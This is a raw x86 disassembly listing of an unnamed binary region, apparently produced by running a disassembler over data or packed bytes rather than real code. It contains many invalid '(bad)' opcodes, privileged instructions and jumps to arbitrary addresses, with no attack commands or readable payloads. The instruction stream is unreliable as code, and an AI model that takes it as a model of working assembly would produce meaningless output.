  41663c:	sbb    DWORD PTR [edx+0x11dfdf73],0xffffff99
  416643:	pushf  
  416644:	fcmovb st,st(2)
  416646:	fdiv   QWORD PTR [edx]
  416648:	add    eax,0xa3817a24
  41664d:	inc    ebp
  41664e:	dec    edx
  41664f:	pop    ecx
  416650:	stos   BYTE PTR es:[edi],al
  416651:	into   
  416652:	fwait
  416653:	inc    edi
  416654:	or     eax,0x84043b32
  416659:	outs   dx,DWORD PTR ds:[esi]
  41665a:	xchg   ecx,eax
  41665b:	arpl   bp,si
  41665d:	(bad)  
  41665f:	aam    0x97
  416661:	gs in  eax,dx
  416663:	mov    edi,0xf3742868
  416668:	push   esi
  416669:	es ss pop ecx
  41666d:	mov    dl,dl
  41666f:	in     al,0xe5
  416671:	loope  0x416698
  416673:	(bad)  
  416674:	mov    ah,0x2c
  416676:	fwait
  416677:	add    al,0xd7
  416679:	stc    
  41667a:	mov    BYTE PTR [ecx-0x433cabe8],bl
  416680:	push   0x15
  416682:	mov    BYTE PTR [esi],0xb
  416685:	mov    ?,WORD PTR [edx+0x70]
  416688:	leave  
  416689:	fiadd  WORD PTR [esp+ecx*4-0x66]
  41668d:	push   0xffffffae
  41668f:	mov    ebx,0x5264fa35
  416694:	les    eax,FWORD PTR [ebx+ecx*4-0x12]
  416698:	add    esi,edi
  41669a:	scas   eax,DWORD PTR es:[edi]
  41669b:	mov    ah,0xc5
  41669d:	rcl    cl,1
  41669f:	and    edi,ebx
  4166a1:	dec    ecx
  4166a2:	xor    ecx,DWORD PTR [ebx]
  4166a4:	jno    0x4166f4
  4166a6:	dec    eax
  4166a7:	pop    ebx
  4166a8:	rcl    DWORD PTR [edx],0xbb
  4166ab:	outs   dx,DWORD PTR ds:[esi]
  4166ac:	pop    esi
  4166ad:	sub    bh,ah
  4166af:	mov    bh,0xbc
  4166b1:	loopne 0x4166e4
  4166b3:	cmp    eax,0x386e9f0f
  4166b8:	aaa    
  4166b9:	inc    bp
  4166bb:	xchg   edi,eax
  4166bc:	int3   
  4166bd:	mov    eax,ecx
  4166bf:	icebp  
  4166c0:	push   esi
  4166c1:	or     esp,esi
  4166c3:	xchg   ebp,eax
  4166c4:	mov    ch,0xbb
  4166c6:	fnstenv [ecx+0x25bcc51]
  4166cc:	out    dx,eax
  4166cd:	data16 daa 
  4166cf:	adc    bl,BYTE PTR [edi]
  4166d1:	add    DWORD PTR [edx-0x3],0xffffffc2
  4166d5:	xchg   ebx,eax
  4166d6:	pop    eax
  4166d7:	ficom  WORD PTR [ecx-0x7a0287e8]
  4166dd:	adc    BYTE PTR [ebx-0x4d],dl
  4166e0:	retf   
  4166e1:	add    BYTE PTR [ecx*8-0x76b5c2e0],ah
  4166e8:	stc    
  4166e9:	push   esp
  4166ea:	repz mov WORD PTR [eax+ebp*8+0x68402ea3],ds
  4166f2:	test   DWORD PTR [edx+0x24],ecx
  4166f5:	dec    ecx
  4166f6:	bound  eax,QWORD PTR [ebp-0x359f5b8a]
  4166fc:	daa    
  4166fd:	xor    DWORD PTR [edi+eax*8+0x5e4bf046],0x4c
  416705:	xchg   ecx,eax
  416706:	scas   al,BYTE PTR es:[edi]
  416707:	fdivr  DWORD PTR [ecx]
  416709:	(bad)  
  41670a:	popa   
  41670b:	hlt    
  41670c:	sar    DWORD PTR [ebp+0x73c828a2],1
  416712:	call   DWORD PTR [edx+0x30]
  416715:	adc    eax,0x46820d57
  41671a:	rcr    BYTE PTR [ecx+ecx*8-0x34a38816],1
  416721:	scas   al,BYTE PTR es:[edi]
  416722:	jecxz  0x41675e
  416724:	push   ecx
  416725:	aas    
  416726:	ins    BYTE PTR es:[edi],dx
  416727:	or     eax,0xaba686fd
  41672c:	iret   
  41672d:	ja     0x41675d
  41672f:	dec    esi
  416730:	mov    ecx,0xab8de664
  416735:	ins    BYTE PTR es:[edi],dx
  416736:	jns    0x416748
  416738:	inc    edi
  416739:	in     eax,0x67
  41673b:	push   cs
  41673c:	pop    ecx
  41673d:	and    BYTE PTR [eax],ch
  41673f:	mov    edx,DWORD PTR [ecx-0x9d81a7a]
  416745:	xchg   edi,eax
  416746:	in     eax,dx
  416747:	inc    ebx
  416748:	add    ebp,ecx
  41674a:	mov    dl,0xae
  41674c:	and    eax,0xeb534547
  416751:	enter  0x9fe7,0xdd
  416755:	jo     0x4166ea
  416757:	(bad)  
  416759:	and    eax,0x2c30eebf
  41675e:	lds    eax,FWORD PTR [esi]
  416760:	in     al,dx
  416761:	mov    cl,BYTE PTR [ebp-0x2acb44f]
  416767:	je     0x41675d
  416769:	mov    ah,0xb
  41676b:	add    bh,BYTE PTR [edi+0x78]
  41676e:	enter  0x685d,0x26
  416772:	pop    ss
  416773:	div    ch
  416775:	arpl   ax,ax
  416777:	push   ss
  416778:	je     0x416762
  41677a:	rcl    DWORD PTR [ebp+0x446d2cc],0xc5
  416781:	test   DWORD PTR [edi],ecx
  416783:	sub    bl,bl
  416785:	sbb    ecx,ebp
  416787:	jmp    0x4167bc
  416789:	cmp    esi,DWORD PTR [ebx]
  41678b:	pop    esp
  41678c:	jmp    0x4b1aa141
  416791:	ror    bh,0x6
  416794:	fwait
  416795:	xor    DWORD PTR [ecx+0x75],0x3b
  416799:	nop
  41679a:	and    ah,BYTE PTR [eax-0x54f6367c]
  4167a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167a1:	int3   
  4167a2:	fistp  DWORD PTR [edi+0x6f5364b1]
  4167a8:	adc    al,0x99
  4167aa:	cmp    eax,0x1c1ad395
  4167af:	dec    eax
  4167b0:	ror    DWORD PTR [edx+0xc],1
  4167b3:	jnp    0x4167b3
  4167b5:	mov    cl,0xad
  4167b7:	pop    ds
  4167b8:	adc    bl,BYTE PTR [edi-0x37]
  4167bb:	addr16 jle 0x416750
  4167be:	sub    BYTE PTR [ecx-0x1fce0b82],dl
  4167c4:	mov    dh,0xb9
  4167c6:	sbb    al,0x18
  4167c8:	sar    DWORD PTR [esi],cl
  4167ca:	inc    edi
  4167cb:	addr16 mov edx,0xcc746103
  4167d1:	andnps xmm0,XMMWORD PTR [eax+0x7]
  4167d5:	xor    ecx,eax
  4167d7:	clc    
  4167d8:	mov    ebx,edx
  4167da:	fwait
  4167db:	mov    eax,0x24e8e263
  4167e0:	shr    DWORD PTR [edx],cl
  4167e2:	pusha  
  4167e3:	jl     0x4167a7
  4167e5:	pop    eax
  4167e6:	add    al,0x8b
  4167e8:	jp     0x416844
  4167ea:	add    ch,bl
  4167ec:	fldcw  WORD PTR [ebp-0x17]
  4167ef:	dec    edi
  4167f0:	fcomp  DWORD PTR [esi+0x47]
  4167f3:	in     eax,dx
  4167f4:	push   edi
  4167f5:	sbb    eax,0x74b16dfa
  4167fa:	adc    ch,dh
  4167fc:	mov    ah,0x29
  4167fe:	fdiv   DWORD PTR [edx*8-0x2680281c]
  416805:	bound  ebp,QWORD PTR [ebx+0x19]
  416808:	shr    BYTE PTR [edi+0x78],cl
  41680b:	adc    al,0x53
  41680d:	add    eax,0x7278b120
  416812:	mov    ds:0x9a07fc10,al
  416817:	mov    dh,0x64
  416819:	ret    
  41681a:	addr16 dec esp
  41681c:	mov    al,ds:0xbdcd5abf
  416821:	int3   
  416822:	sub    BYTE PTR [ecx+edi*8],0xd0
  416826:	mov    cl,0x26
  416828:	mov    eax,ds:0xea6155be
  41682d:	fs cmp al,0x22
  416830:	jnp    0x41683e
  416832:	sbb    ebp,DWORD PTR [edx+0x353ae19f]
  416838:	mov    eax,ebx
  41683a:	imul   eax,DWORD PTR [edx],0x6bf6e068
  416840:	mov    ah,0x6d
  416842:	in     al,dx
  416843:	pusha  
  416844:	xor    ah,BYTE PTR [eax-0x7e2372c]
  41684a:	pop    ebx
  41684b:	xor    bh,BYTE PTR [ecx-0x5a]
  41684e:	or     cl,BYTE PTR [edi+ecx*4]
  416851:	(bad)  
  416852:	icebp  
  416853:	cli    
  416854:	push   edi
  416855:	lock cmp BYTE PTR [edx-0x1a],bh
  416859:	inc    ebp
  41685a:	mov    ch,0xe
  41685c:	nop
  41685d:	ror    BYTE PTR [ecx-0x52],0x96
  416861:	ins    DWORD PTR es:[edi],dx
  416862:	mov    dh,0xf
  416864:	mov    esp,0xf9977d0b
  416869:	clc    
  41686a:	shl    DWORD PTR [esi],1
  41686c:	jb     0x4168d6
  41686e:	jle    0x4168c7
  416870:	pushf  
  416871:	xchg   DWORD PTR [ebx+0x651540a6],ebx
  416877:	ret    
  416878:	pop    esp
  416879:	cmp    eax,0xf0b534c6
  41687e:	jnp    0x4168e0
  416880:	xchg   ebp,eax
  416881:	mov    al,0xf6
  416883:	mov    esp,0xeee00199
  416888:	mov    ch,0x78
  41688a:	adc    edx,DWORD PTR [edx-0x566915db]
  416890:	not    edi
  416892:	sub    eax,0xf3c54e2a
  416897:	and    cl,BYTE PTR [ebx+0x3]
  41689a:	xor    ch,ch
  41689c:	pop    edi
  41689d:	xchg   edi,eax
  41689e:	fs shl ecx,0x97
  4168a2:	aaa    
  4168a3:	pop    es
  4168a4:	push   0x3b
  4168a6:	xor    al,0xe7
  4168a8:	push   esp
  4168a9:	lock lea esp,[esi-0x472ae606]
  4168b0:	mov    edi,?
  4168b2:	sbb    edx,ebx
  4168b4:	fisttp DWORD PTR [esi]
  4168b6:	xor    eax,0xdd555a89
  4168bb:	dec    edx
  4168bc:	jp     0x41689c
  4168be:	icebp  
  4168bf:	adc    esp,DWORD PTR [edx-0x2eb18e07]
  4168c5:	scas   al,BYTE PTR es:[edi]
  4168c6:	jno    0x4168d9
  4168c8:	data16 js 0x41685a
  4168cb:	fidivr DWORD PTR [ebx-0xf]
  4168ce:	sbb    ebx,edi
  4168d0:	ds retf 
  4168d2:	js     0x4168e5
  4168d4:	fdiv   DWORD PTR [ecx-0x4a]
  4168d7:	loop   0x416899
  4168d9:	pop    esi
  4168da:	mov    ah,bl
  4168dc:	mov    edx,0x9ba93017
  4168e1:	push   ecx
  4168e2:	imul   BYTE PTR [esi+0x45]
  4168e5:	sub    al,0x24
  4168e7:	sub    BYTE PTR [ebx-0x3bf24f72],dl
  4168ed:	pop    ecx
  4168ee:	int3   
  4168ef:	inc    ebp
  4168f0:	nop    DWORD PTR [edi+0x16]
  4168f4:	mov    ecx,0xfa0d0c51
  4168f9:	xlat   BYTE PTR ds:[ebx]
  4168fa:	pop    esp
  4168fb:	sub    eax,0xac4ef0bd
  416900:	outs   dx,BYTE PTR ds:[esi]
  416901:	and    BYTE PTR [edi+0x11],ah
  416904:	div    edi
  416906:	cmp    BYTE PTR [eax-0x30],ah
  416909:	call   DWORD PTR [edx-0x66]
  41690c:	dec    esp
  41690d:	imul   esp,DWORD PTR fs:[eax],0x77
  416911:	es wrmsr 
  416914:	push   ecx
  416915:	in     eax,0x78
  416917:	mov    edi,0xb69b72bd
  41691c:	fistp  DWORD PTR [ecx]
  41691e:	jg     0x4168a9
  416920:	rcr    BYTE PTR [eax-0x32],cl
  416923:	out    dx,al
  416924:	xchg   DWORD PTR [eax-0x45],ebp
  416927:	jbe    0x416905
  416929:	aam    0x7d
  41692b:	sub    DWORD PTR [edi+0x5e8ad634],eax
  416931:	test   al,0x7f
  416933:	addr16 dec di
  416936:	jae    0x41696d
  416938:	xchg   esi,eax
  416939:	ins    DWORD PTR es:[edi],dx
  41693a:	xchg   ebp,eax
  41693b:	fdivr  QWORD PTR [esi]
  41693d:	(bad)  
  41693e:	out    dx,eax
  41693f:	js     0x416990
  416941:	inc    ebx
  416942:	adc    DWORD PTR [ecx],esi
  416944:	mov    dh,0xff
  416946:	xchg   bl,ah
  416948:	push   ss
  416949:	test   al,0xe0
  41694b:	and    BYTE PTR [edi-0x5cdf8ede],ch
  416951:	mov    eax,ds:0x13e303de
  416956:	cmp    cl,BYTE PTR [eax]
  416958:	cmp    bl,cl
  41695a:	sbb    BYTE PTR cs:[edx-0x1e1cb033],0x7f
  416962:	fisttp QWORD PTR [edx+0x174d7c3a]
  416968:	lock sar DWORD PTR [eax+0x2031fd3a],0xa1
  416970:	jecxz  0x41691a
  416972:	lahf   
  416973:	or     eax,0x5c01c7fb
  416978:	retf   0xb33
  41697b:	mov    esp,0x4d0aeee7
  416980:	xor    DWORD PTR [edi+ecx*8-0x2e7664bc],esp
  416987:	sar    BYTE PTR [ecx],0xe7
  41698a:	ds cmp al,0x1f
  41698d:	test   BYTE PTR [esi-0x30],ch
  416990:	mov    esi,DWORD PTR [edx+edi*1+0x79144e94]
  416997:	add    eax,0x4f9bde7b
  41699c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41699d:	rcl    DWORD PTR [edx+0x72],1
  4169a0:	mov    al,ds:0x8e281eea
  4169a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169a6:	or     al,0x0
  4169a8:	rcr    BYTE PTR [ecx+0x6f],cl
  4169ab:	sbb    esi,edx
  4169ad:	pop    esi
  4169ae:	cmp    BYTE PTR [esi+0x69],dl
  4169b1:	mov    bl,0x1a
  4169b3:	cld    
  4169b4:	pop    ss
  4169b5:	xor    DWORD PTR [esi+0x6],eax
  4169b8:	mov    ds:0xc1b9cb43,al
  4169bd:	popf   
  4169be:	imul   esp,DWORD PTR [edx],0x95305dd9
  4169c4:	inc    ecx
  4169c5:	retf   
  4169c6:	mov    eax,ds:0x6d5d8279
  4169cb:	jno    0x416a48
  4169cd:	(bad)  
  4169ce:	pop    edi
  4169cf:	and    dh,BYTE PTR [eax-0x2f530062]
  4169d5:	lods   al,BYTE PTR ds:[esi]
  4169d6:	(bad)  
  4169d7:	mov    ebx,0xb61584cf
  4169dc:	jb     0x416a33
  4169de:	xor    DWORD PTR [ecx-0xd49d91c],0x8d9be5a4
  4169e8:	ins    BYTE PTR es:[edi],dx
  4169e9:	add    ch,dh
  4169eb:	(bad)  [ecx*4+0x35c9c9fa]
  4169f2:	inc    ebx
  4169f3:	pop    edx
  4169f4:	xor    edi,DWORD PTR [ebx-0x6b]
  4169f7:	ss idiv ebp
  4169fa:	inc    esp
  4169fb:	jg     0x416a69
  4169fd:	push   edx
  4169fe:	out    dx,al
  4169ff:	jo     0x4169a7
  416a01:	jno    0x416a79
  416a03:	clc    
  416a04:	(bad)  
  416a05:	fwait
  416a06:	lock (bad) 
  416a08:	rcr    DWORD PTR [ecx+ebx*4+0x39],cl
  416a0c:	out    0xfb,eax
  416a0e:	test   BYTE PTR [edx-0x700bd4af],cl
  416a14:	mov    al,ds:0xc299e602
  416a19:	add    DWORD PTR [edi+0x4c],esi
  416a1c:	iret   
  416a1d:	scas   eax,DWORD PTR es:[edi]
  416a1e:	jno    0x4169f7
  416a20:	inc    eax
  416a21:	rol    BYTE PTR [esi+edx*2],0x79
  416a25:	mov    ds:0xfdc2f549,al
  416a2a:	sub    ebp,DWORD PTR [edi+0x6c]
  416a2d:	sbb    edx,ebx
  416a2f:	test   DWORD PTR [eax+0x1f],edi
  416a32:	mov    edx,0xc1293a9a
  416a37:	fisttp WORD PTR ds:0x60b906dc
  416a3d:	push   0x1de7e732
  416a42:	imul   esp,ebx,0xffffffdd
  416a45:	dec    esi
  416a46:	jnp    0x416a41
  416a48:	jl     0x416a9f
  416a4a:	or     eax,0xd4b9a608
  416a4f:	push   es
  416a50:	inc    esp
  416a51:	sub    al,0xb4
  416a53:	xchg   edx,eax
  416a54:	mov    dh,0x71
  416a56:	addr16 icebp 
  416a58:	fistp  WORD PTR [edi]
  416a5a:	mov    cl,0x25
  416a5c:	das    
  416a5d:	rcr    BYTE PTR [eax],cl
  416a5f:	cmp    DWORD PTR [edi],0x38
  416a62:	sub    eax,ebp
  416a64:	mov    eax,0xcb8bbcd2
  416a69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a6b:	sub    al,0xc2
  416a6d:	loop   0x416a00
  416a6f:	ja     0x416aa4
  416a71:	cmp    ebx,ebx
  416a73:	pop    es
  416a74:	int    0x1d
  416a76:	scas   al,BYTE PTR es:[edi]
  416a77:	gs aas 
  416a79:	popa   
  416a7a:	test   DWORD PTR [ebx-0x52260e2],edx
  416a80:	mov    al,ds:0x4a2ca4b8
  416a85:	test   eax,0xb50d33c
  416a8a:	pop    ecx
  416a8b:	test   ecx,esp
  416a8d:	push   edi
  416a8e:	mov    bh,0x8b
  416a90:	mov    ebp,0x992a131d
  416a95:	mov    ds:0x5323a96b,eax
  416a9a:	and    eax,0xffffff8f
  416a9d:	enter  0x926b,0x2
  416aa1:	cdq    
  416aa2:	outs   dx,DWORD PTR cs:[esi]
  416aa4:	fucomi st,st(3)
  416aa6:	push   0xffffffff
  416aa8:	fiadd  WORD PTR [eax]
  416aaa:	jo     0x416aba
  416aac:	in     eax,dx
  416aad:	test   DWORD PTR [edi+0x39],ecx
  416ab0:	in     eax,0x1e
  416ab2:	xchg   esi,eax
  416ab3:	xchg   ecx,eax
  416ab4:	dec    DWORD PTR [ebp+edi*4-0x58de4ed1]
  416abb:	add    bl,dl
  416abd:	push   esp
  416abe:	mov    BYTE PTR [ebx+0x5c],bl
  416ac1:	leave  
  416ac2:	mov    ds,WORD PTR [esi]
  416ac4:	fsubr  DWORD PTR [ecx]
  416ac6:	sub    BYTE PTR [ebx-0x223be4b0],ch
  416acc:	ja     0x416a52
  416ace:	iret   
  416acf:	shl    esp,cl
  416ad1:	add    eax,0x8672e7c
  416ad6:	mov    esp,0xeb0c1117
  416adb:	push   ebp
  416adc:	gs repnz in eax,0x5e
  416ae0:	into   
  416ae1:	xor    eax,0x70eebab0
  416ae6:	popa   
  416ae7:	push   ebp
  416ae8:	dec    eax
  416ae9:	dec    esp
  416aea:	neg    BYTE PTR [ecx-0x76abe9a5]
  416af0:	test   BYTE PTR [eax-0x4e],ah
  416af3:	hlt    
  416af4:	rcr    DWORD PTR [ebx-0x2],cl
  416af7:	fwait
  416af8:	cli    
  416af9:	mov    eax,ds:0x869fd850
  416afe:	enter  0x8863,0xf
  416b02:	inc    esi
  416b03:	int    0xc7
  416b05:	sahf   
  416b06:	and    eax,0x78b19ce0
  416b0b:	popf   
  416b0c:	in     eax,0x5f
  416b0e:	lea    edx,[edx+0x75]
  416b11:	outs   dx,BYTE PTR ds:[esi]
  416b12:	jno    0x416b86
  416b14:	sahf   
  416b15:	stc    
  416b16:	jns    0x416b89
  416b18:	in     eax,dx
  416b19:	enter  0xd4ba,0xa2
  416b1d:	mov    bl,0x57
  416b1f:	lock xchg ebx,eax
  416b21:	sbb    bh,BYTE PTR [edi+0x222a4d22]
  416b27:	fisttp QWORD PTR [eax]
  416b29:	sbb    eax,0xd6d33ca8
  416b2e:	sub    DWORD PTR [esi-0x12d10be7],ebx
  416b34:	fcom   DWORD PTR [esi+0x4e]
  416b37:	pop    esp
  416b38:	sbb    dl,BYTE PTR [edi-0x4a1dc0fa]
  416b3e:	xor    al,0x5b
  416b40:	xchg   esi,eax
  416b41:	mov    eax,ds:0x50a9b02
  416b46:	lods   eax,DWORD PTR ds:[esi]
  416b47:	fldenv [ecx-0x40c27082]
  416b4d:	rol    BYTE PTR [ebp-0x779d2b9a],cl
  416b53:	pop    ebx
  416b54:	jno    0x416b5a
  416b56:	(bad)  
  416b57:	lea    esi,[ebx]
  416b59:	mov    eax,ds:0x5badcdf6
  416b5e:	(bad)
  416b62:	std    
  416b63:	loope  0x416b15
  416b65:	jnp    0x416b20
  416b67:	pop    esp
  416b68:	dec    edi
  416b69:	les    edi,FWORD PTR [eax+0x44f052be]
  416b6f:	or     BYTE PTR [ebp+0x21],dh
  416b72:	inc    eax
  416b73:	imul   ebp,DWORD PTR [ecx-0x521dc13d],0xffffffd8
  416b7a:	and    DWORD PTR [ebx-0x11],esp
  416b7d:	dec    ecx
  416b7e:	adc    edi,DWORD PTR [edx+0xc]
  416b81:	les    ecx,FWORD PTR [edi-0xc3c34e0]
  416b87:	sbb    BYTE PTR [ebx-0x44],0xea
  416b8b:	pusha  
  416b8c:	add    al,0xd4
  416b8e:	(bad)  
  416b8f:	push   ebx
  416b90:	js     0x416be0
  416b92:	aas    
  416b93:	and    eax,0xc7c2a4ad
  416b98:	sub    dl,BYTE PTR [edx-0x331bb964]
  416b9e:	int    0x99
  416ba0:	fwait
  416ba1:	fwait
  416ba2:	imul   ebp,DWORD PTR [eax+eiz*1-0x5511258],0xffffffc0
  416baa:	aaa    
  416bab:	xor    BYTE PTR [ecx],cl
  416bad:	cmc    
  416bae:	es ss loope 0x416bfc
  416bb2:	shl    bh,cl
  416bb4:	cmp    al,BYTE PTR [esi-0x6bf49cab]
  416bba:	cld    
  416bbb:	fiadd  WORD PTR [eax-0x5e9f0ea7]
  416bc1:	scas   eax,DWORD PTR es:[edi]
  416bc2:	arpl   WORD PTR [eax],di
  416bc4:	repnz xchg ecx,eax
  416bc6:	or     ch,BYTE PTR [ecx-0x3983dc3e]
  416bcc:	jle    0x416b52
  416bce:	icebp  
  416bcf:	ja     0x416c1d
  416bd1:	iret   
  416bd2:	mov    ds:0x72ecc4cb,al
  416bd7:	retf   0xf40c
  416bda:	jns    0x416c11
  416bdc:	lods   al,BYTE PTR ds:[esi]
  416bdd:	sbb    ebx,DWORD PTR [esp+edx*8+0x15]
  416be1:	cli    
  416be2:	in     eax,dx
  416be3:	mov    cl,0xc
  416be5:	es jecxz 0x416c0b
  416be8:	pop    ebx
  416be9:	and    dl,BYTE PTR [edi-0x3ead0b69]
  416bef:	pop    ss
  416bf0:	(bad)  
  416bf1:	call   0x6550:0xba49b0ba
  416bf8:	push   eax
  416bf9:	and    ah,bh
  416bfb:	es pusha 
  416bfd:	add    BYTE PTR [eax-0x69ee72c0],bh
  416c03:	shl    al,1
  416c05:	out    dx,eax
  416c06:	retf   0xf866
  416c09:	fidivr DWORD PTR [ebx+edi*8]
  416c0c:	rcr    eax,cl
  416c0e:	push   ebx
  416c0f:	imul   edx,ebx,0xe45230ec
  416c15:	int3   
  416c16:	mov    esi,0x22abe2dc
  416c1b:	push   cs
  416c1c:	sub    BYTE PTR [ebx],ch
  416c1e:	xor    edi,DWORD PTR [edi]
  416c20:	ror    DWORD PTR [esi-0x41d4c69],cl
  416c26:	adc    eax,0x88a8ec7c
  416c2b:	xchg   ebp,eax
  416c2c:	call   0x26983ad2
  416c31:	mov    esp,0x9d8c80c2
  416c36:	int    0x7
  416c38:	xchg   esi,eax
  416c39:	mov    WORD PTR [ecx-0x73e53bf3],es
  416c3f:	cs mov dh,0x5e
  416c42:	cmp    DWORD PTR [ecx+ebx*1],edx
  416c45:	pop    es
  416c46:	(bad)  
  416c47:	ins    BYTE PTR es:[edi],dx
  416c48:	pop    es
  416c49:	mov    ?,WORD PTR [esp+ebx*1-0x42a8e73d]
  416c50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c51:	jns    0x416c6e
  416c53:	cmp    ch,cl
  416c55:	xchg   edi,eax
  416c56:	ss stc 
  416c58:	ins    DWORD PTR es:[edi],dx
  416c59:	inc    eax
  416c5a:	mov    al,ds:0xbd469523
  416c5f:	cmp    eax,0xa5b5e340
  416c64:	push   edi
  416c65:	and    DWORD PTR [eax+eax*4+0x115a2561],ebp
  416c6c:	div    cl
  416c6e:	and    bh,BYTE PTR [edx]
  416c70:	inc    edx
  416c71:	pop    ecx
  416c72:	(bad)  
  416c73:	pusha  
  416c74:	ja     0x416c8a
  416c76:	jl     0x416cbe
  416c78:	push   edi
  416c79:	arpl   WORD PTR [ecx],ax
  416c7b:	jmp    0xd971:0xf58c8bd4
  416c82:	(bad)  
  416c83:	or     al,0x1b
  416c85:	lods   eax,DWORD PTR ds:[esi]
  416c86:	mov    ds:0x1f879e91,al
  416c8b:	xchg   esp,eax
  416c8c:	pop    ss
  416c8d:	sbb    ah,BYTE PTR [ecx]
  416c8f:	and    DWORD PTR [ebx-0x36],edi
  416c92:	inc    ebx
  416c93:	lea    eax,[ebp+0x75]
  416c96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c97:	push   esp
  416c98:	push   ebp
  416c99:	push   es
  416c9a:	mov    ds:0x33d9abbb,al
  416c9f:	mov    edx,edi
  416ca1:	xchg   edx,eax
  416ca2:	push   0x2a
  416ca4:	mov    al,0x7d
  416ca6:	scas   eax,DWORD PTR es:[edi]
  416ca7:	jp     0x416cd7
  416ca9:	pop    es
  416caa:	adc    ebp,DWORD PTR [edi]
  416cac:	cmp    dl,BYTE PTR [ebx+esi*4]
  416caf:	bound  esi,QWORD PTR [eax+ecx*1-0x49]
  416cb3:	or     ecx,DWORD PTR [ebx-0x66d75489]
  416cb9:	out    0x7a,eax
  416cbb:	mov    esi,0xb9bd8e18
  416cc0:	cmp    edi,DWORD PTR [ecx+0x65]
  416cc3:	add    ah,BYTE PTR [edi]
  416cc5:	scas   eax,DWORD PTR es:[edi]
  416cc6:	shl    DWORD PTR [edx],1
  416cc8:	mov    ah,0xca
  416cca:	mov    dl,0x2d
  416ccc:	mov    al,ds:0xdfc1720c
  416cd1:	out    dx,al
  416cd2:	fldcw  WORD PTR [edx+0x73]
  416cd5:	xor    BYTE PTR [ebx-0x28e9a003],bl
  416cdb:	jle    0x416d18
  416cdd:	mov    al,ds:0x9c0d875c
  416ce2:	adc    ecx,ecx
  416ce4:	push   edx
  416ce5:	in     al,0xf4
  416ce7:	mov    dl,0x4
  416ce9:	loopne 0x416c7b
  416ceb:	pop    edi
  416cec:	retf   
  416ced:	out    0xb4,eax
  416cef:	sbb    DWORD PTR [ebx],eax
  416cf1:	or     BYTE PTR [ebx-0x7efef5fb],bl
  416cf7:	and    al,0x93
  416cf9:	and    BYTE PTR [eax],0x29
  416cfc:	push   ecx
  416cfd:	add    BYTE PTR [ebp+edx*4+0x65c8717c],bh
  416d04:	aaa    
  416d05:	popf   
  416d06:	xor    BYTE PTR [ebx-0xc],cl
  416d09:	rol    edx,1
  416d0b:	lock es mov eax,0x993c6026
  416d12:	fcom   st(5)
  416d14:	xchg   ecx,eax
  416d15:	push   esi
  416d16:	mov    esi,0x52e04324
  416d1b:	add    ah,BYTE PTR [ebp+0x4c]
  416d1e:	cdq    
  416d1f:	adc    eax,0xb8c4e5e3
  416d24:	gs ss dec edx
  416d27:	mov    esi,edx
  416d29:	(bad)  
  416d2a:	cmp    eax,0xb2c9832a
  416d2f:	call   0xb0e1627a
  416d34:	cld    
  416d35:	and    DWORD PTR [ebp-0x53c35496],ebp
  416d3b:	or     eax,0xe149001a
  416d40:	pop    esp
  416d41:	sbb    bh,cl
  416d43:	inc    eax
  416d44:	stos   BYTE PTR es:[edi],al
  416d45:	pop    ds
  416d46:	sub    ebp,esi
  416d48:	fsubp  st(5),st
  416d4a:	lods   al,BYTE PTR ds:[esi]
  416d4b:	sub    BYTE PTR [ecx+ebp*8],0x7d
  416d4f:	mov    esp,0x3d56e1c9
  416d54:	mov    WORD PTR [esi-0x61f17b57],ds
  416d5a:	mov    ah,0xb2
  416d5c:	mov    edx,0xa5050bd0
  416d61:	mov    ebx,0x3b85c457
  416d66:	leave  
  416d67:	ja     0x416db9
  416d69:	mov    ebx,gs
  416d6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d6c:	inc    eax
  416d6d:	xchg   edi,eax
  416d6e:	jno    0x416d94
  416d70:	clc    
  416d71:	fimul  WORD PTR [ecx-0x71]
  416d74:	addr16 dec ecx
  416d76:	inc    eax
  416d77:	sub    DWORD PTR [ecx-0x37614569],ecx
  416d7d:	fs fcom st(5)
  416d80:	repnz mov WORD PTR [edi+0x5c6338b7],ss
  416d87:	out    dx,eax
  416d88:	out    0xd1,eax
  416d8a:	inc    edx
  416d8b:	loop   0x416d98
  416d8d:	pop    ds
  416d8e:	xor    BYTE PTR [ecx+ebx*2],ch
  416d91:	sti    
  416d92:	push   edi
  416d93:	cmc    
  416d94:	sub    al,0x77
  416d96:	mov    DWORD PTR [esi+0x75],ecx
  416d99:	mov    WORD PTR ds:0x7e657c14,cs
  416d9f:	adc    BYTE PTR ds:0x92fb8751,cl
  416da5:	push   cs
  416da6:	arpl   WORD PTR [ecx],bx
  416da8:	jo     0x416dd9
  416daa:	into   
  416dab:	pop    ecx
  416dac:	bound  esp,QWORD PTR [ebp-0x2110823a]
  416db2:	mov    BYTE PTR [esi-0x16d28170],ah
  416db8:	loope  0x416dea
  416dba:	push   edx
  416dbb:	lahf   
  416dbc:	ja     0x416daf
  416dbe:	jp     0x416d49
  416dc0:	dec    edi
  416dc1:	or     BYTE PTR [edx+0x4f0b8ba1],ch
  416dc7:	dec    esp
  416dc8:	out    dx,al
  416dc9:	and    BYTE PTR [eax],dh
  416dcb:	adc    cl,ch
  416dcd:	inc    esp
  416dce:	mov    esp,0x50334513
  416dd3:	mov    fs,WORD PTR [ecx+0x37ac0ca2]
  416dd9:	mov    esi,0x1066f694
  416dde:	jg     0x416d9d
  416de0:	xchg   edx,eax
  416de1:	jne    0x416e44
  416de3:	jecxz  0x416d6d
  416de5:	fadd   QWORD PTR [eax+0x7e]
  416de8:	dec    ebp
  416de9:	pop    ebp
  416dea:	ins    DWORD PTR es:[edi],dx
  416deb:	int    0x72
  416ded:	adc    al,dl
  416def:	dec    edx
  416df0:	fimul  DWORD PTR [esi]
  416df2:	in     al,0xd5
  416df4:	retf   0xd71f
  416df7:	sub    al,0x4f
  416df9:	or     edx,DWORD PTR [ecx-0x18]
  416dfc:	xor    edi,DWORD PTR [ecx+0x6b]
  416dff:	mov    DWORD PTR [ebp-0x7b],ebp
  416e02:	scas   al,BYTE PTR es:[edi]
  416e03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e04:	inc    ecx
  416e05:	mov    dl,0x57
  416e07:	mov    cl,0xa2
  416e09:	lock push esi
